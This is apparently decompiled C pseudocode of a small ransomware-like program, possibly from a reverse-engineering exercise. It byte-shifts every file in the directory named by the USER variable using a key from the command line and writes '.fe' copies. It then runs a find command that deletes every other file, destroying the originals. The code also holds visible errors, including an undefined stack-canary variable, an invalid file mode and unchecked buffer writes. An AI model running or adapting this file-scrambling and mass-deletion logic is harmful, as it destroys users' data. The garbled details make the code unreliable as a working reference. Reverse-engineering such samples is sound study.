undefined8 main (int param_1, undefined8 *param_2)

{
  char *__name;
  int iVar1;
  int iVar2;
  undefined8 uVar3; 
  DIR *__dirp;
  int *piVar4;
  dirent *pdVar5;
  long in_FS_OFFSET;
  long buffer1;
  char buffer2 [512];
  char buffer3 [520];
  FILE *__stream1;
  FILE *__stream2;
  
  buffer1 = *(long *)(in_FS_OFFSET + 0x28);
  __name = getenv ("USER");

  if (param_1 < 2) {
    printf ("usage: ./%s <argument>", *param_2);
    uVar3 = 1;
  }

  else {
    iVar1 = atoi ((char *) param_2 [1]);
    __dirp = opendir (__name);

    if (__dirp == (DIR *)0x0) {
      piVar4 = __errno_location ();
      __name = strerror (*piVar4);
      fprintf (stderr,"Error : Failed to open input directory - %s\n", __name);
      uVar3 = 1;
    }

    else {
      while (pdVar5 = readdir (__dirp), pdVar5 != (dirent *)0x0) {
        iVar2 = strcmp (pdVar5->d_name, ".");

        if ((iVar2 != 0) && (iVar2 = strcmp (pdVar5->d_name, ".."), iVar2 != 0)) {
          sprintf (buffer2, "%s/%s", __name, pdVar5->d_name);
          __stream1 = fopen (buffer2, "rw");

          if (__stream1 == (FILE *)0x0) {
            piVar4 = __errno_location ();
            __name = strerror (*piVar4);
            fprintf (stderr, "Error : Failed to open %s - %s\n", buffer2, __name);
            uVar3 = 1;

            goto BUFF_OV;
          }

          sprintf (buffer3, "%s.fe", buffer2);
          __stream2 = fopen (buffer3, "w");

          while (true) {
            iVar2 = fgetc (__stream1);
            if ((char) iVar2 == -1) break;
            fputc ((char) iVar2 - iVar1, __stream2); /* Decryption */
          }

          fclose (__stream2);
          fclose (__stream1);
        }
      }

      system ("find $USER -type f ! -name \'*.fe\' -delete");
      uVar3 = 0;
    }
  }
  
BUFF_OV:
  if (local_10 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail ();
}